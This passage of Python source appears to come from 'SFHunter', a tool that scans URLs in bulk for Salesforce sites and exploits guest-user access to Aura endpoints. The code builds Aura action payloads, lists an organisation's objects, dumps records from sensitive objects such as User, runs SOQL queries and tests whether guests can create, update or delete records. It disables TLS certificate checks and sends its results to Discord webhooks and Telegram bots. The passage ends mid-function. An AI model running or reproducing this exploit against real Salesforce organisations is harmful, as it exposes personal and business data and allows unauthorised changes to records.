                        "name": "📊 Data Exposure",
                        "value": f"{exposed_count} sensitive objects accessible",
                        "inline": True
                    })
            
            requests.post(webhook_url, json={"embeds": [embed]})
            
        except Exception as e:
            logger.error("Discord exploitation findings error: {}".format(e))

    def send_telegram_exploitation_findings(self, url: str, findings: Dict):
        """Send detailed exploitation findings to Telegram"""
        bot_token = self.config.get("telegram_bot_token")
        chat_id = self.config.get("telegram_chat_id")
        
        if not bot_token or not chat_id:
            return
        
        try:
            # Create detailed message for exploitation findings
            message = f"🚨 <b>CRITICAL: Salesforce Exploitation Results</b>\n\n"
            message += f"🌐 <b>Target:</b> <code>{url}</code>\n\n"
            
            if findings.get("vulnerable"):
                message += "⚠️ <b>Status:</b> VULNERABLE - Guest user access detected\n\n"
            
            # Add critical findings
            critical_findings = []
            if findings.get("write_permissions", {}).get("critical_findings"):
                critical_findings.extend(findings["write_permissions"]["critical_findings"])
            
            if findings.get("data_exposure"):
                exposed_objects = [obj for obj, data in findings["data_exposure"].items() if data.get("success")]
                if exposed_objects:
                    critical_findings.append(f"CRITICAL: Sensitive objects exposed: {', '.join(exposed_objects)}")
            
            if critical_findings:
                message += "🔥 <b>Critical Findings:</b>\n"
                for finding in critical_findings[:5]:  # Limit to 5 findings
                    message += f"• {finding}\n"
                message += "\n"
            
            # Add write permissions summary
            write_perms = findings.get("write_permissions", {})
            if write_perms.get("create_permissions") or write_perms.get("update_permissions") or write_perms.get("delete_permissions"):
                message += "✍️ <b>Write Permissions:</b>\n"
                if write_perms.get("create_permissions"):
                    message += f"• CREATE: {', '.join(write_perms['create_permissions'].keys())}\n"
                if write_perms.get("update_permissions"):
                    message += f"• UPDATE: {', '.join(write_perms['update_permissions'].keys())}\n"
                if write_perms.get("delete_permissions"):
                    message += f"• DELETE: {', '.join(write_perms['delete_permissions'].keys())}\n"
                message += "\n"
            
            # Add data exposure summary
            if findings.get("data_exposure"):
                exposed_count = len([obj for obj, data in findings["data_exposure"].items() if data.get("success")])
                if exposed_count > 0:
                    message += f"📊 <b>Data Exposure:</b> {exposed_count} sensitive objects accessible\n\n"
            
            message += f"🕐 <i>Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>"
            
            # Send to Telegram
            telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            requests.post(telegram_url, data=data)
            
        except Exception as e:
            logger.error("Telegram exploitation findings error: {}".format(e))

    def send_discord_file(self, filepath: str, results: List[Dict]):
        """Send the actual text file to Discord webhook"""
        webhook_url = self.config.get("discord_webhook_url")
        if not webhook_url or not webhook_url.strip():
            return
        
        try:
            # Send the actual file to Discord
            with open(filepath, "rb") as f:
                files = {"file": f}
                data = {"content": "SFHunter Scan Results"}
                requests.post(webhook_url, files=files, data=data)
                    
        except Exception as e:
            logger.error("Discord file upload error: {}".format(e))

    def send_telegram_message(self, message: str, filepath: str = None):
        """Send message to Telegram bot"""
        bot_token = self.config.get("telegram_bot_token")
        chat_id = self.config.get("telegram_chat_id")
        
        if not bot_token or not chat_id:
            return
            
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, data=data)
            response.raise_for_status()
            
            # Send file if provided
            if filepath and os.path.exists(filepath):
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                with open(filepath, "rb") as f:
                    files = {"document": f}
                    data = {"chat_id": chat_id}
                    requests.post(url, files=files, data=data)
                    
        except Exception as e:
            logger.error("Telegram message error: {}".format(e))

    def send_telegram_embed(self, domain: str, url: str, status: str, title: str, signals: List[str]):
        """Send individual Telegram message for detected site"""
        bot_token = self.config.get("telegram_bot_token")
        chat_id = self.config.get("telegram_chat_id")
        
        if not bot_token or not chat_id:
            return
            
        message = f"""
🔍 <b>Salesforce Site Detected</b>

🌐 <b>Domain:</b> <code>{domain}</code>
🔗 <b>URL:</b> <a href="{url}">{url}</a>
📊 <b>Status:</b> {status}
📝 <b>Title:</b> {title}
🎯 <b>Signals:</b> {', '.join(signals) if signals else 'No signals'}

<i>SFHunter Detection</i>
"""
        
        try:
            url_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            }
            requests.post(url_api, data=data)
        except Exception as e:
            logger.error("Telegram embed error: {}".format(e))

    def send_to_discord(self, results: List[Dict], filepath: str):
        """Send results to Discord webhook"""
        webhook_url = self.config.get("discord_webhook_url")
        if not webhook_url:
            logger.warning("No Discord webhook URL configured")
            return
        
        try:
            # Send individual messages for each detection
            for result in results:
                if result.get("status") == "detected":
                    domain = urlparse(result['final_url']).netloc
                    signals = result.get('signals', [])
                    
                    with self.sent_to_discord_lock:
                        if domain not in self.sent_to_discord:
                            self.send_discord_message(
                                result['final_url'],
                                signals
                            )
                            self.sent_to_discord.add(domain)
            
            # Send results summary in text format
            self.send_discord_file(filepath, results)
            logger.info("Results sent to Discord successfully")
            
        except Exception as e:
            logger.error("Error sending to Discord: {}".format(e))
    
    def update_progress(self, success: bool = True, verified: bool = False):
        """Update scan progress and statistics"""
        with self.stats_lock:
            self.scan_stats['processed_count'] += 1
            if success:
                self.scan_stats['successful_scans'] += 1
                if verified:
                    self.scan_stats['verified_findings'] += 1
                else:
                    self.scan_stats['unverified_findings'] += 1
            else:
                self.scan_stats['failed_scans'] += 1

    def print_progress(self):
        """Print progress in jshunter style"""
        with self.stats_lock:
            total = self.scan_stats['total_urls']
            processed = self.scan_stats['processed_count']
            success = self.scan_stats['successful_scans']
            failed = self.scan_stats['failed_scans']
            verified = self.scan_stats['verified_findings']
            unverified = self.scan_stats['unverified_findings']
            
            if total > 0:
                percentage = (processed / total) * 100
                rate = processed / max(1, (time.time() - self.scan_stats['start_time']))
                eta_seconds = (total - processed) / max(0.1, rate)
                eta_minutes = eta_seconds / 60
                
                # Only print progress every 10 processed URLs to avoid interfering with logs
                if processed % 10 == 0 or processed == total:
                    print(f"\n[PROGRESS] {processed}/{total} ({percentage:.1f}%) | Rate: {rate:.1f}/s | ETA: {eta_minutes:.1f}m | Success: {success} | Failed: {failed} | Verified: {verified} | Unverified: {unverified}")

    def worker(self, url: str, check_content: bool = False):
        """Worker function for threaded scanning"""
        try:
            # Normalize URL to handle domains without protocol
            urls_to_try = self.normalize_url(url)
            
            for test_url in urls_to_try:
                result = self.detect_salesforce(test_url, check_content)
                if result:
                    with self.detected_sites_lock:
                        self.detected_instances.append(result)
                    
                    with self.detected_count_lock:
                        self.detected_count += 1
                    
                # Send Discord and Telegram notifications for this detection
                domain = urlparse(result['final_url']).netloc
                signals = result.get('signals', [])
                
                with self.sent_to_discord_lock:
                    if domain not in self.sent_to_discord:
                        # Send Discord notification
                        self.send_discord_message(
                            result['final_url'],
                            signals
                        )
                        
                        # Send Telegram notification
                        self.send_telegram_embed(
                            domain, 
                            result['final_url'], 
                            result.get('detection_method', 'unknown'),
                            result['final_url'],
                            signals
                        )
                        
                        self.sent_to_discord.add(domain)
                    
                    # Update progress with verified finding
                    self.update_progress(success=True, verified=True)
                    self.print_progress()
                    return  # Found a match, no need to try other protocols
                    
            # No Salesforce detected
            self.update_progress(success=True, verified=False)
            self.print_progress()
                        
        except Exception as e:
            self.update_progress(success=False, verified=False)
            self.print_progress()
            # Error logging is handled in detect_salesforce method

    def scan_urls(self, urls: List[str], check_content: bool = False) -> List[Dict]:
        """Scan multiple URLs for Salesforce instances"""
        results = []
        
        # Initialize scan statistics
        with self.stats_lock:
            self.scan_stats['total_urls'] = len(urls)
            self.scan_stats['start_time'] = time.time()
            self.scan_stats['processed_count'] = 0
            self.scan_stats['successful_scans'] = 0
            self.scan_stats['failed_scans'] = 0
            self.scan_stats['verified_findings'] = 0
            self.scan_stats['unverified_findings'] = 0
        
        if self.high_performance:
            print(f"[*] Using high-performance mode for {len(urls)} URLs")
            print(f"[*] Performance settings: {self.max_workers} workers, {self.concurrent_downloads} concurrent downloads, {self.batch_size} batch size")
            print(f"[*] Starting high-performance scan of {len(urls)} URLs")
            print(f"[*] Configuration: {self.concurrent_downloads} concurrent downloads, {self.batch_size} batch size, {self.max_workers} workers")
            
            # Process in batches
            num_batches = math.ceil(len(urls) / self.batch_size)
            for batch_num in range(num_batches):
                start_idx = batch_num * self.batch_size
                end_idx = min(start_idx + self.batch_size, len(urls))
                batch_urls = urls[start_idx:end_idx]
                
                print(f"[*] Processing chunk {batch_num + 1}/{num_batches} ({len(batch_urls)} URLs)")
                
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    # Use lambda to pass check_content parameter
                    executor.map(lambda url: self.worker(url, check_content), batch_urls)
            
            results = self.detected_instances.copy()
        else:
            print(f"[*] Using legacy mode for {len(urls)} URLs")
            for i, url in enumerate(urls, 1):
                print(f"[+] Scanning {url}")
                
                # Normalize URL to handle domains without protocol
                urls_to_try = self.normalize_url(url)
                
                found_salesforce = False
                for test_url in urls_to_try:
                    result = self.detect_salesforce(test_url, check_content)
                    if result:
                        results.append(result)
                        self.detected_instances.append(result)
                        print(f"[+] Salesforce found in {test_url}: {', '.join(result.get('signals', []))}")
                        found_salesforce = True
                        break  # Found a match, no need to try other protocols
                
                # Update progress
                self.update_progress(success=True, verified=found_salesforce)
                
                # Add delay between requests to be respectful
                time.sleep(1)
        
        return results
    
    def scan_from_file(self, filepath: str) -> List[Dict]:
        """Scan URLs from a file (one URL per line)"""
        try:
            with open(filepath, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            logger.info("Loaded {} URLs from {}".format(len(urls), filepath))
            return self.scan_urls(urls)
            
        except FileNotFoundError:
            logger.error("File not found: {}".format(filepath))
            return []
    
    def generate_report(self, results: List[Dict]) -> str:
        """Generate a human-readable report"""
        detected = [r for r in results if r.get("status") == "detected"]
        
        report = f"""
# Salesforce Detection Report
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

## Summary
- Total URLs analyzed: {len(results)}
- Salesforce instances detected: {len(detected)}

## Detected Instances
"""
        
        for i, result in enumerate(detected, 1):
            report += f"""
### Instance {i}
- **Original URL:** {result['original_url']}
- **Final URL:** {result['final_url']}
- **Detection Method:** {result['detection_method']}
- **Redirect Chain:** {' → '.join(result['redirect_chain'])}
- **Timestamp:** {result['timestamp']}
"""
        
        return report
    
    def print_scan_summary(self):
        """Print scan summary in jshunter style"""
        with self.stats_lock:
            total = self.scan_stats['total_urls']
            success = self.scan_stats['successful_scans']
            failed = self.scan_stats['failed_scans']
            verified = self.scan_stats['verified_findings']
            unverified = self.scan_stats['unverified_findings']
            total_findings = verified + unverified
        
        print(f"\n[+] Scan Summary:")
        print(f"    Total URLs: {total}")
        print(f"    Successful scans: {success}")
        print(f"    Failed scans: {failed}")
        print(f"    Verified findings: {verified}")
        print(f"    Unverified findings: {unverified}")
        print(f"    Total findings: {total_findings}")
        print(f"\n[+] Scan complete: {success}/{total} successful, {total_findings} total findings")

    # Exploitation methods
    def http_request(self, url: str, values: str = '', method: str = 'GET') -> str:
        """HTTP request helper function for exploitation"""
        headers = {'User-Agent': USER_AGENT}
        if method == 'POST':
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = urllib.parse.urlencode(values).encode('ascii')
            request = urllib.request.Request(url, data=data, method=method, headers=headers)
        else:
            request = urllib.request.Request(url, method=method, headers=headers)
        
        try:
            # Create SSL context that doesn't verify certificates
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(request, context=ctx) as response:
                return response.read().decode("utf-8")
        except URLError as e:
            raise

    def check_aura_vulnerability(self, url: str) -> List[str]:
        """Check for vulnerable Aura endpoints"""
        aura_endpoints = []
        for path in AURA_PATH_PATTERNS:
            tmp_aura_endpoint = urllib.parse.urljoin(url, path)
            try:
                response_body = self.http_request(tmp_aura_endpoint, values={}, method='POST')
            except HTTPError as e:
                response_body = e.read().decode("utf-8")
            if "aura:invalidSession" in response_body:
                aura_endpoints.append(tmp_aura_endpoint)
        return aura_endpoints

    def get_aura_context(self, url: str) -> str:
        """Generate Aura context for exploitation"""
        try:
            response_body = self.http_request(url)
        except Exception as e:
            logger.error("Failed to access the url: {}".format(e))
            raise

        if ("window.location.href ='%s" % url) in response_body:
            location_url = re.search(r'window.location.href =\'([^\']+)', response_body)
            url = location_url.group(1)
            try:
                response_body = self.http_request(url)
            except Exception as e:
                logger.error("Failed to access the redirect url: {}".format(e))
                raise

        aura_encoded = re.search(r'\/s\/sfsites\/l\/([^\/]+fwuid[^\/]+)', response_body)
        if aura_encoded is not None:
            response_body = urllib.parse.unquote(aura_encoded.group(1))

        fwuid = re.search(r'"fwuid":"([^"]+)', response_body)
        markup = re.search(r'"(APPLICATION@markup[^"]+)":"([^"]+)"', response_body)
        app = re.search(r'"app":"([^"]+)', response_body)

        if fwuid is None or markup is None or app is None:
            raise Exception("Couldn't find fwuid or markup")
        
        aura_context = f'{{"mode":"PROD","fwuid":"{fwuid.group(1)}","app":"{app.group(1)}","loaded":{{"{markup.group(1)}":"{markup.group(2)}"}},"dn":[],"globals":{{}},"uad":false}}'
        return aura_context

    def create_payload_for_getItems(self, object_name: str, page_size: int, page: int) -> str:
        """Create payload for getting object items"""
        return f'{{"actions":[{{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{{"entityNameOrId":"{object_name}","layoutType":"FULL","pageSize":{page_size},"currentPage":{page},"useTimeout":false,"getCount":true,"enableRowActions":false}}}}]}}'

    def create_payload_for_getRecord(self, record_id: str) -> str:
        """Create payload for getting a specific record"""
        return f'{{"actions":[{{"id":"pwn","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{{"recordId":"{record_id}","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}}}]}}'

    def exploit_aura_endpoint(self, aura_endpoint: str, payload: str, aura_context: str) -> Dict:
        """Exploit Aura endpoint with given payload"""
        url = f"{aura_endpoint}?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1"
        values = {'message': payload, 'aura.context': aura_context, 'aura.token': 'undefined'}
        try:
            response_body = self.http_request(url, values=values, method='POST')
            
            # Check if response is HTML instead of JSON
            if response_body.strip().startswith('<!DOCTYPE html>') or response_body.strip().startswith('<html'):
                logger.warning("Received HTML response instead of JSON. Endpoint may be protected or require authentication.")
                return {"exceptionEvent": "HTML_RESPONSE", "message": "Endpoint returned HTML instead of JSON"}
            
            return json.loads(response_body)
        except JSONDecodeError as je:
            logger.error("JSON Decode error. Response -> {}".format(response_body[:500]))
            return {"exceptionEvent": "JSON_DECODE_ERROR", "response": response_body[:500]}
        except Exception as e:
            logger.error("Request failed: {}".format(str(e)))
            return {"exceptionEvent": "REQUEST_FAILED", "error": str(e)}

    def pull_object_list(self, aura_endpoint: str, aura_context: str) -> List[str]:
        """Pull the object list from Salesforce"""
        logger.info("Pulling the object list")
        sf_all_object_name_list = []
        try:
            response = self.exploit_aura_endpoint(aura_endpoint, PAYLOAD_PULL_CUSTOM_OBJ, aura_context)
            if response.get('exceptionEvent'):
                raise Exception(response)
            if not response.get('actions') or not response.get('actions')[0].get('state'):
                raise Exception(f"Failed to get actions: {response}")

            SF_OBJECT_NAME_dict = response["actions"][0]["returnValue"]["apiNamesToKeyPrefixes"]
            SF_OBJECT_NAME_list = [key for key in SF_OBJECT_NAME_dict.keys() if not key.endswith("__c")]
            sf_custom_object_name = [key for key in SF_OBJECT_NAME_dict.keys() if key.endswith("__c")]
            sf_all_object_name_list = list(SF_OBJECT_NAME_dict.keys())
            
            logger.info("Default object list: {}".format(', '.join(SF_OBJECT_NAME_list)))
            logger.info("Custom object list: {}".format(', '.join(sf_custom_object_name)))
        except Exception as e:
            logger.error("Failed to pull the object list: {}".format(e))
        return sf_all_object_name_list

    def dump_object(self, aura_endpoint: str, aura_context: str, object_name: str, page_size: int = DEFAULT_PAGE_SIZE, page: int = DEFAULT_PAGE) -> Optional[Dict]:
        """Dump object data from Salesforce"""
        logger.info("Getting \"{}\" object (page number {})...".format(object_name, page))
        payload = self.create_payload_for_getItems(object_name, page_size, page)
        try:
            response = self.exploit_aura_endpoint(aura_endpoint, payload, aura_context)
            if response.get('exceptionEvent'):
                raise Exception(response)
            actions = response['actions'][0]
            state = actions['state']
            return_value = actions['returnValue']
            total_count = return_value.get('totalCount', 'None')
            result_count = return_value.get('result', [])
            logger.info("State: {}, Total: {}, Page: {}, Result count: {}".format(state, total_count, page, len(result_count)))
            if state == "ERROR":
                logger.error("Error message: {}".format(actions['error'][0]))
            return response
        except Exception as e:
            logger.error("Failed to exploit: {}".format(e))
            return None

    def exploit_salesforce(self, url: str, objects: List[str] = None, list_objects: bool = False, dump_objects: bool = False) -> Dict:
        """Main exploitation function for Salesforce Aura endpoints"""
        if objects is None:
            objects = ['User']
        
        logger.info("Looking for aura endpoint and checking vulnerability")
        aura_endpoints = self.check_aura_vulnerability(url)
        
        if not aura_endpoints:
            logger.warning("Url doesn't seem to be vulnerable")
            return {"vulnerable": False, "endpoints": []}
        else:
            logger.info("Found vulnerable endpoint(s): {}".format(', '.join(aura_endpoints)))

        logger.info("Starting exploit")
        try:
            aura_context = self.get_aura_context(url)
            logger.info("Successfully generated aura.context")
        except Exception as e:
            logger.error("Failed to get aura context: {}".format(e))
            return {"vulnerable": True, "endpoints": aura_endpoints, "error": "Failed to get aura context"}

        results = {"vulnerable": True, "endpoints": aura_endpoints, "exploits": []}
        
        for aura_endpoint in aura_endpoints:
            logger.info("Exploiting endpoint: {}".format(aura_endpoint))
            endpoint_result = {"endpoint": aura_endpoint, "results": [], "aura_context": aura_context}
            
            if list_objects:
                object_list = self.pull_object_list(aura_endpoint, aura_context)
                endpoint_result["object_list"] = object_list
            elif dump_objects:
                object_list = self.pull_object_list(aura_endpoint, aura_context)
                for object_name in object_list[:5]:  # Limit to first 5 objects for safety
                    response = self.dump_object(aura_endpoint, aura_context, object_name)
                    if response:
                        endpoint_result["results"].append({
                            "object": object_name,
                            "data": response['actions'][0]['returnValue']
                        })
            else:
                for object_name in objects:
                    response = self.dump_object(aura_endpoint, aura_context, object_name)
                    if response:
                        endpoint_result["results"].append({
                            "object": object_name,
                            "data": response['actions'][0]['returnValue']
                        })
            
            results["exploits"].append(endpoint_result)
        
        return results

    def advanced_lightning_exploitation(self, url: str, deep_scan: bool = False) -> Dict:
        """Advanced Lightning framework exploitation with deep testing"""
        logger.info("Starting advanced Lightning exploitation")
        
        # First get basic vulnerability info
        basic_result = self.exploit_salesforce(url, list_objects=True)
        if not basic_result.get("vulnerable"):
            return basic_result
        
        advanced_results = {
            "vulnerable": True,
            "endpoints": basic_result.get("endpoints", []),
            "basic_objects": basic_result.get("exploits", []),
            "advanced_exploits": [],
            "org_info": {},
            "security_analysis": {},
            "data_extraction": {}
        }
        
        for exploit in basic_result.get("exploits", []):
            endpoint = exploit.get("endpoint")
            if not endpoint:
                continue
                
            logger.info("Performing advanced exploitation on: {}".format(endpoint))
            
            try:
                # Get Aura context
                aura_context = self.get_aura_context(url)
                
                # Advanced payload testing
                advanced_payload_results = self.test_advanced_payloads(endpoint, aura_context)
                advanced_results["advanced_exploits"].append({
                    "endpoint": endpoint,
                    "payload_results": advanced_payload_results
                })
                
                # Organization information gathering
                org_info = self.gather_org_information(endpoint, aura_context)
                advanced_results["org_info"].update(org_info)
                
                # Security analysis
                security_analysis = self.perform_security_analysis(endpoint, aura_context)
                advanced_results["security_analysis"].update(security_analysis)
                
                # Deep data extraction if requested
                if deep_scan:
                    data_extraction = self.perform_deep_data_extraction(endpoint, aura_context)
                    advanced_results["data_extraction"].update(data_extraction)
                    
            except Exception as e:
                logger.error("Advanced exploitation failed for {}: {}".format(endpoint, e))
        
        return advanced_results

    def test_advanced_payloads(self, endpoint: str, aura_context: str) -> Dict:
        """Test advanced Lightning payloads for deeper access"""
        payload_results = {}
        
        for payload_name, payload in ADVANCED_PAYLOADS.items():
            try:
                logger.info("Testing payload: {}".format(payload_name))
                response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
                
                if response and not response.get('exceptionEvent'):
                    payload_results[payload_name] = {
                        "success": True,
                        "data": response
                    }
                    logger.info("Payload {} succeeded".format(payload_name))
                else:
                    payload_results[payload_name] = {
                        "success": False,
                        "error": response.get('exceptionEvent', 'Unknown error')
                    }
                    
            except Exception as e:
                payload_results[payload_name] = {
                    "success": False,
                    "error": str(e)
                }
                logger.warning("Payload {} failed: {}".format(payload_name, e))
        
        return payload_results

    def gather_org_information(self, endpoint: str, aura_context: str) -> Dict:
        """Gather comprehensive organization information"""
        org_info = {}
        
        # Test organization info payloads
        org_payloads = ['get_org_info', 'get_user_info', 'get_org_limits', 'get_org_health']
        
        for payload_name in org_payloads:
            if payload_name in ADVANCED_PAYLOADS:
                try:
                    response = self.exploit_aura_endpoint(endpoint, ADVANCED_PAYLOADS[payload_name], aura_context)
                    if response and not response.get('exceptionEvent'):
                        org_info[payload_name] = response
                except Exception as e:
                    logger.warning("Failed to get {}: {}".format(payload_name, e))
        
        return org_info

    def perform_security_analysis(self, endpoint: str, aura_context: str) -> Dict:
        """Perform security-focused analysis"""
        security_analysis = {}
        
        # Test security-related payloads
        security_payloads = [
            'get_profiles', 'get_permission_sets', 'get_connected_apps',
            'get_remote_sites', 'get_csp_trusted_sites', 'get_metadata'
        ]
        
        for payload_name in security_payloads:
            if payload_name in ADVANCED_PAYLOADS:
                try:
                    response = self.exploit_aura_endpoint(endpoint, ADVANCED_PAYLOADS[payload_name], aura_context)
                    if response and not response.get('exceptionEvent'):
                        security_analysis[payload_name] = response
                except Exception as e:
                    logger.warning("Security analysis failed for {}: {}".format(payload_name, e))
        
        return security_analysis

    def perform_deep_data_extraction(self, endpoint: str, aura_context: str) -> Dict:
        """Perform deep data extraction using advanced queries"""
        data_extraction = {}
        
        # Test sensitive objects
        for object_name in SENSITIVE_OBJECTS[:10]:  # Limit to first 10 for performance
            try:
                logger.info("Extracting data from: {}".format(object_name))
                response = self.dump_object(endpoint, aura_context, object_name, page_size=50, page=1)
                if response and response.get('actions', [{}])[0].get('state') == 'SUCCESS':
                    data_extraction[object_name] = {
                        "success": True,
                        "record_count": len(response['actions'][0]['returnValue'].get('result', [])),
                        "total_count": response['actions'][0]['returnValue'].get('totalCount', 0),
                        "sample_data": response['actions'][0]['returnValue'].get('result', [])[:5]  # First 5 records
                    }
                else:
                    data_extraction[object_name] = {
                        "success": False,
                        "error": "Access denied or no data"
                    }
            except Exception as e:
                data_extraction[object_name] = {
                    "success": False,
                    "error": str(e)
                }
                logger.warning("Deep extraction failed for {}: {}".format(object_name, e))
        
        return data_extraction

    def create_advanced_query_payload(self, query: str) -> str:
        """Create payload for advanced SOQL queries"""
        return f'{{"actions":[{{"id":"query","descriptor":"serviceComponent://ui.force.components.controllers.soql.SoqlController/ACTION$executeQuery","callingDescriptor":"UNKNOWN","params":{{"query":"{query}"}}}}]}}'

    def execute_advanced_query(self, endpoint: str, aura_context: str, query: str) -> Optional[Dict]:
        """Execute advanced SOQL query"""
        try:
            payload = self.create_advanced_query_payload(query)
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            return response
        except Exception as e:
            logger.error("Advanced query failed: {}".format(e))
            return None

    def comprehensive_lightning_test(self, url: str) -> Dict:
        """Comprehensive Lightning framework testing"""
        logger.info("Starting comprehensive Lightning framework test")
        
        results = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "vulnerability_assessment": {},
            "org_discovery": {},
            "security_analysis": {},
            "data_exposure": {},
            "recommendations": []
        }
        
        # Basic vulnerability check
        basic_result = self.exploit_salesforce(url, list_objects=True)
        results["vulnerability_assessment"] = basic_result
        
        if not basic_result.get("vulnerable"):
            results["recommendations"].append("No immediate vulnerabilities detected")
            return results
        
        # Advanced exploitation
        advanced_result = self.advanced_lightning_exploitation(url, deep_scan=True)
        results["org_discovery"] = advanced_result.get("org_info", {})
        results["security_analysis"] = advanced_result.get("security_analysis", {})
        results["data_exposure"] = advanced_result.get("data_extraction", {})
        
        # Generate recommendations
        recommendations = self.generate_security_recommendations(advanced_result)
        results["recommendations"] = recommendations
        
        return results

    def generate_security_recommendations(self, advanced_result: Dict) -> List[str]:
        """Generate security recommendations based on findings"""
        recommendations = []
        
        # Check for exposed sensitive data
        data_exposure = advanced_result.get("data_extraction", {})
        exposed_objects = [obj for obj, data in data_exposure.items() if data.get("success")]
        
        if exposed_objects:
            recommendations.append("CRITICAL: Sensitive objects exposed: {}".format(", ".join(exposed_objects)))
            recommendations.append("Immediately review guest user permissions and object-level security")
        
        # Check for security misconfigurations
        security_analysis = advanced_result.get("security_analysis", {})
        if security_analysis.get("get_remote_sites"):
            recommendations.append("Review Remote Site Settings for unnecessary external access")
        
        if security_analysis.get("get_csp_trusted_sites"):
            recommendations.append("Audit CSP Trusted Sites configuration")
        
        if security_analysis.get("get_connected_apps"):
            recommendations.append("Review Connected App configurations and OAuth settings")
        
        # Check for metadata exposure
        if security_analysis.get("get_metadata"):
            recommendations.append("CRITICAL: Metadata exposure detected - review guest user access to metadata")
        
        # General recommendations
        recommendations.extend([
            "Implement proper guest user permissions and sharing rules",
            "Enable field-level security for sensitive data",
            "Review and restrict Aura endpoint access",
            "Implement proper CSP policies",
            "Regular security audits and penetration testing"
        ])
        
        return recommendations

    def test_write_permissions(self, endpoint: str, aura_context: str) -> Dict:
        """Test what objects and fields guest users can WRITE to with PoC validation"""
        logger.info("Testing write permissions for guest users with PoC validation")
        write_permissions = {
            "writable_objects": [],
            "writable_fields": {},
            "create_permissions": {},
            "update_permissions": {},
            "delete_permissions": {},
            "critical_findings": [],
            "poc_results": {},
            "exploitable_objects": [],
            "poc_payloads": {},
            "poc_evidence": {},
            "exploitation_summary": {}
        }
        
        # Test write permissions on sensitive objects
        test_objects = ['User', 'Account', 'Contact', 'Lead', 'Case', 'Task', 'Event', 'Note', 'Attachment']
        
        for object_name in test_objects:
            try:
                logger.info("Testing write permissions for: {}".format(object_name))
                
                # Test CREATE permission with PoC
                create_result = self.test_create_permission(endpoint, aura_context, object_name)
                if create_result.get("success"):
                    write_permissions["create_permissions"][object_name] = create_result
                    write_permissions["critical_findings"].append("CRITICAL: Guest user can CREATE {} records".format(object_name))
                    
                    # Perform PoC validation
                    poc_result = self.perform_create_poc(endpoint, aura_context, object_name)
                    if poc_result.get("exploitable"):
                        write_permissions["poc_results"][f"{object_name}_CREATE"] = poc_result
                        write_permissions["exploitable_objects"].append(f"{object_name} (CREATE)")
                        write_permissions["poc_evidence"][f"{object_name}_CREATE"] = poc_result.get("evidence", {})
                        logger.info("🚨 PoC SUCCESS: CREATE {} - {}".format(object_name, poc_result.get("summary", "")))
                elif create_result.get("error") == "HTML_RESPONSE":
                    logger.warning("Skipping {} due to HTML response - endpoint may be protected".format(object_name))
                    break  # Stop testing if we get HTML responses
                
                # Test UPDATE permission with PoC
                update_result = self.test_update_permission(endpoint, aura_context, object_name)
                if update_result.get("success"):
                    write_permissions["update_permissions"][object_name] = update_result
                    write_permissions["critical_findings"].append("CRITICAL: Guest user can UPDATE {} records".format(object_name))
                    
                    # Perform PoC validation
                    poc_result = self.perform_update_poc(endpoint, aura_context, object_name)
                    if poc_result.get("exploitable"):
                        write_permissions["poc_results"][f"{object_name}_UPDATE"] = poc_result
                        write_permissions["exploitable_objects"].append(f"{object_name} (UPDATE)")
                        write_permissions["poc_evidence"][f"{object_name}_UPDATE"] = poc_result.get("evidence", {})
                        logger.info("🚨 PoC SUCCESS: UPDATE {} - {}".format(object_name, poc_result.get("summary", "")))
                
                # Test DELETE permission with PoC
                delete_result = self.test_delete_permission(endpoint, aura_context, object_name)
                if delete_result.get("success"):
                    write_permissions["delete_permissions"][object_name] = delete_result
                    write_permissions["critical_findings"].append("CRITICAL: Guest user can DELETE {} records".format(object_name))
                    
                    # Perform PoC validation
                    poc_result = self.perform_delete_poc(endpoint, aura_context, object_name)
                    if poc_result.get("exploitable"):
                        write_permissions["poc_results"][f"{object_name}_DELETE"] = poc_result
                        write_permissions["exploitable_objects"].append(f"{object_name} (DELETE)")
                        write_permissions["poc_evidence"][f"{object_name}_DELETE"] = poc_result.get("evidence", {})
                        logger.info("🚨 PoC SUCCESS: DELETE {} - {}".format(object_name, poc_result.get("summary", "")))
                
                # Test field-level write permissions
                field_permissions = self.test_field_write_permissions(endpoint, aura_context, object_name)
                if field_permissions.get("writable_fields"):
                    write_permissions["writable_fields"][object_name] = field_permissions["writable_fields"]
                
            except Exception as e:
                logger.warning("Write permission test failed for {}: {}".format(object_name, e))
        
        return write_permissions

    def test_create_permission(self, endpoint: str, aura_context: str, object_name: str) -> Dict:
        """Test if guest user can create records"""
        try:
            # Create a test record payload
            test_data = self.generate_test_record_data(object_name)
            payload = self.create_payload_for_create_record(object_name, test_data)
            
            response = self.exploit_aura_endpoint(endpoint, payload, aura_context)
            
            # Check for HTML response
            if response.get('exceptionEvent') == 'HTML_RESPONSE':
                return {
                    "success": False,
                    "error": "HTML_RESPONSE",
                    "message": "Endpoint returned HTML instead of JSON - may be protected"
                }
            
            if response and not response.get('exceptionEvent'):
                actions = response.get('actions', [])
                if actions and actions[0].get('state') == 'SUCCESS':
                    return {
                        "success": True,
                        "message": "Guest user can CREATE {} records".format(object_name),
                        "test_data": test_data,
                        "response": response
                    }
                else:
                    return {
                        "success": False,
